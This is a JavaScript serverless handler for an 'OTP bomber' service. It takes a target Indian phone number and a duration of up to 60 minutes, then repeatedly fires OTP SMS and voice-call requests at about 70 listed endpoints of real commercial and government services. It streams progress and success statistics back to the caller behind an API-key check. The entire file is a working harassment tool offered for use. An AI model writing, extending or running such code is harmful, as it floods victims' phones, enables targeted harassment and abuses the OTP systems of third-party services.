// bomber/bomber.js
const fs = require('fs');
const path = require('path');

// Load keys from keys.json
const keysPath = path.join(process.cwd(), 'keys.json');
let keys = {};

try {
  if (fs.existsSync(keysPath)) {
    keys = JSON.parse(fs.readFileSync(keysPath, 'utf8'));
  }
} catch (error) {
  console.error('Error loading keys.json:', error);
}

// All services from the example
const services = [
  { name: "mobapp.tatacapital.com", type: "VOICE CALL", url: "https://mobapp.tatacapital.com/api/v1/otp/send", method: "POST", body: (phone) => JSON.stringify({ mobileNumber: phone }) },
  { name: "apigateway.apollo247.in", type: "VOICE CALL", url: "https://apigateway.apollo247.in/voice/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "mxemjhp3rt.ap-south-1.awsapprunner.com", type: "VOICE CALL", url: "https://mxemjhp3rt.ap-south-1.awsapprunner.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "profile.swiggy.com", type: "VOICE CALL", url: "https://profile.swiggy.com/api/v1/otp/send", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "www.1mg.com", type: "VOICE CALL", url: "https://www.1mg.com/otp/send", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "bikroy.com", type: "SMS", url: "https://bikroy.com/api/v1/otp/send", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "backoffice.ecourier.com.bd", type: "SMS", url: "https://backoffice.ecourier.com.bd/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone_number: phone }) },
  { name: "api.shikho.com", type: "SMS", url: "https://api.shikho.com/auth/otp/send", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "app.eonbazar.com", type: "SMS", url: "https://app.eonbazar.com/api/v1/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "developer.quizgiri.xyz", type: "SMS", url: "https://developer.quizgiri.xyz/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "prod-api.viewlift.com", type: "SMS", url: "https://prod-api.viewlift.com/otp/send", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "go-app.paperfly.com.bd", type: "SMS", url: "https://go-app.paperfly.com.bd/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api.paragonfood.com.bd", type: "SMS", url: "https://api.paragonfood.com.bd/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "apix.rabbitholebd.com", type: "SMS", url: "https://apix.rabbitholebd.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api.bd.airtel.com", type: "SMS", url: "https://api.bd.airtel.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.swap.com.bd", type: "SMS", url: "https://api.swap.com.bd/api/otp/send", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "fundesh.com.bd", type: "SMS", url: "https://fundesh.com.bd/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.osudpotro.com", type: "SMS", url: "https://api.osudpotro.com/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "weblogin.grameenphone.com", type: "SMS", url: "https://weblogin.grameenphone.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.khatabook.com", type: "SMS", url: "https://api.khatabook.com/otp/send", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api.doubtnut.com", type: "SMS", url: "https://api.doubtnut.com/auth/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "www.my11circle.com", type: "SMS", url: "https://www.my11circle.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "pharmeasy.in", type: "SMS", url: "https://pharmeasy.in/api/otp/send", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "myaccount.policybazaar.com", type: "SMS", url: "https://myaccount.policybazaar.com/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.purplle.com", type: "SMS", url: "https://www.purplle.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.account.relianceretail.com", type: "SMS", url: "https://api.account.relianceretail.com/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.bajajelectronics.com", type: "SMS", url: "https://www.bajajelectronics.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "kukufm.com", type: "SMS", url: "https://kukufm.com/api/otp/send", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api-prod.bewakoof.com", type: "SMS", url: "https://api-prod.bewakoof.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "blinkit.com", type: "SMS", url: "https://blinkit.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "communication.api.hungama.com", type: "SMS", url: "https://communication.api.hungama.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "merucabapp.com", type: "SMS", url: "https://merucabapp.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "ekyc.daycoindia.com", type: "SMS", url: "https://ekyc.daycoindia.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "www.rummycircle.com", type: "SMS", url: "https://www.rummycircle.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.nobroker.in", type: "SMS", url: "https://www.nobroker.in/api/otp/send", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.beepkart.com", type: "SMS", url: "https://api.beepkart.com/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "sr-wave-api.shiprocket.in", type: "SMS", url: "https://sr-wave-api.shiprocket.in/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.kpnfresh.com", type: "SMS", url: "https://api.kpnfresh.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api.bikefixup.com", type: "SMS", url: "https://api.bikefixup.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.servetel.in", type: "SMS", url: "https://api.servetel.in/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "stratzy.in", type: "SMS", url: "https://stratzy.in/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.penpencil.co", type: "SMS", url: "https://api.penpencil.co/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.myimaginestore.com", type: "SMS", url: "https://www.myimaginestore.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "mxemjhp3rt.ap-south-1.awsapprunner.com", type: "SMS", url: "https://mxemjhp3rt.ap-south-1.awsapprunner.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.foxy.in", type: "SMS", url: "https://www.foxy.in/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "route.smytten.com", type: "SMS", url: "https://route.smytten.com/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "auth.eka.care", type: "SMS", url: "https://auth.eka.care/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "customer.rapido.bike", type: "SMS", url: "https://customer.rapido.bike/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "m.snapdeal.com", type: "SMS", url: "https://m.snapdeal.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "www.shopsy.in", type: "SMS", url: "https://www.shopsy.in/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.samsung.com", type: "SMS", url: "https://www.samsung.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "entri.app", type: "SMS", url: "https://entri.app/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "oidc.agrevolution.in", type: "SMS", url: "https://oidc.agrevolution.in/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "user-auth.otpless.app", type: "SMS", url: "https://user-auth.otpless.app/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "www.justdial.com", type: "SMS", url: "https://www.justdial.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "3via.ly", type: "INTERNATIONAL", url: "https://3via.ly/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "winmore.ly", type: "INTERNATIONAL", url: "https://winmore.ly/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "member.daraz.com.np", type: "INTERNATIONAL", url: "https://member.daraz.com.np/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "securedapi.confirmtkt.com", type: "SMS", url: "https://securedapi.confirmtkt.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "t.justdial.com", type: "SMS", url: "https://t.justdial.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "login.housing.com", type: "SMS", url: "https://login.housing.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "porter.in", type: "SMS", url: "https://porter.in/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "unacademy.com", type: "SMS", url: "https://unacademy.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "www.treebo.com", type: "SMS", url: "https://www.treebo.com/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api.dream11.com", type: "SMS", url: "https://api.dream11.com/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "callbomberz.online", type: "SMS", url: "https://callbomberz.online/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "api.rafixt.xyz", type: "CALL", url: "https://api.rafixt.xyz/call", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "training.gov.bd", type: "SMS", url: "https://training.gov.bd/api/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) },
  { name: "bdtools.top", type: "SMS", url: "https://bdtools.top/api/otp", method: "POST", body: (phone) => JSON.stringify({ mobile: phone }) },
  { name: "api.rafixt.xyz", type: "SMS", url: "https://api.rafixt.xyz/otp", method: "POST", body: (phone) => JSON.stringify({ phone: phone }) }
];

// Make bomb request
async function makeBombRequest(service, phone, batchNum, requestNum) {
  try {
    const response = await fetch(service.url, {
      method: service.method,
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Mobile) AppleWebKit/537.36"
      },
      body: service.body(phone)
    });

    const status = response.status;
    const isSuccess = status >= 200 && status < 300;

    return {
      success: isSuccess,
      status: status
    };

  } catch (error) {
    return {
      success: false,
      status: 0
    };
  }
}

// Format phone number
function formatPhoneNumber(phone) {
  const cleaned = phone.toString().replace(/\D/g, '');
  
  if (cleaned.length === 10 && /^[6-9]/.test(cleaned)) {
    return '91' + cleaned;
  }
  
  if (cleaned.length === 12 && cleaned.startsWith('91') && /^91[6-9]/.test(cleaned)) {
    return cleaned;
  }
  
  return null;
}

// Get end time
function getEndTime(minutes) {
  const end = new Date();
  end.setMinutes(end.getMinutes() + minutes);
  return end.toLocaleString('en-US', { 
    year: 'numeric', 
    month: '2-digit', 
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
    hour12: false 
  }).replace(/(\d+)\/(\d+)\/(\d+)/, '$3-$1-$2');
}

export default async function handler(req, res) {
  // Set CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'GET') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { key, number, duration = 10 } = req.query;

  // Validate API key
  if (!key || !keys.validKeys?.includes(key)) {
    return res.status(401).json({ 
      error: "Invalid API key"
    });
  }

  // Validate phone number
  const formattedPhone = formatPhoneNumber(number);
  if (!formattedPhone) {
    return res.status(400).json({ 
      error: "Invalid phone number - Must be 10 digit Indian number"
    });
  }

  // Validate duration
  const durationNum = parseInt(duration);
  if (isNaN(durationNum) || durationNum < 1 || durationNum > 60) {
    return res.status(400).json({ 
      error: "Duration must be 1-60 minutes"
    });
  }

  // Set response headers for streaming
  res.setHeader('Content-Type', 'text/plain; charset=utf-8');
  res.setHeader('Transfer-Encoding', 'chunked');

  const startTime = new Date();
  const endTime = getEndTime(durationNum);

  // Send initial response
  res.write(`🚀 ULTIMATE OTP BOMBER STARTED\n`);
  res.write(`📞 Target: ${formattedPhone}\n`);
  res.write(`⏰ Duration: ${durationNum} minutes\n`);
  res.write(`🔁 Running until: ${endTime}\n`);
  res.write(`==========================================\n\n`);

  let batchCount = 0;
  const batchSize = services.length;
  const endTimestamp = Date.now() + (durationNum * 60 * 1000);
  let totalSuccess = 0;
  let totalRequests = 0;

  // Main bombing loop
  while (Date.now() < endTimestamp) {
    batchCount++;
    res.write(`🎯 BATCH #${batchCount} STARTED\n`);

    let batchSuccess = 0;

    for (let i = 0; i < services.length; i++) {
      const service = services[i];
      const result = await makeBombRequest(service, formattedPhone, batchCount, i + 1);
      
      const statusIcon = result.success ? "✅" : "❌";
      res.write(`   🔄 [${i + 1}/${batchSize}] ${service.type} - ${service.name}\n`);
      res.write(`     ${statusIcon} ${result.success ? "SUCCESS" : "FAILED"}${result.status ? ` - Code: ${result.status}` : ''}\n`);
      
      if (result.success) {
        batchSuccess++;
        totalSuccess++;
      }
      totalRequests++;

      // Small delay between requests
      await new Promise(resolve => setTimeout(resolve, 50));
    }

    const timeLeft = Math.max(0, Math.floor((endTimestamp - Date.now()) / 1000 / 60));
    const secondsLeft = Math.max(0, Math.floor((endTimestamp - Date.now()) / 1000 % 60));

    res.write(`✅ Batch #${batchCount} completed - Success: ${batchSuccess}/${batchSize}\n`);
    res.write(`📊 Total: ${totalRequests} | Success: ${totalSuccess} | Time left: ${timeLeft}m ${secondsLeft}s\n`);

    // Check if time is up
    if (Date.now() >= endTimestamp) {
      break;
    }

    res.write(`⏳ Waiting 1 seconds...\n\n`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  const successRate = ((totalSuccess / totalRequests) * 100).toFixed(2);
  
  res.write(`\n🎯 BOMBING COMPLETED!\n`);
  res.write(`📈 Final Stats:\n`);
  res.write(`   📞 Phone: ${formattedPhone}\n`);
  res.write(`   ⏱️  Duration: ${durationNum} minutes\n`);
  res.write(`   📤 Total Requests: ${totalRequests}\n`);
  res.write(`   ✅ Successful: ${totalSuccess}\n`);
  res.write(`   📊 Success Rate: ${successRate}%\n`);

  res.end();
}
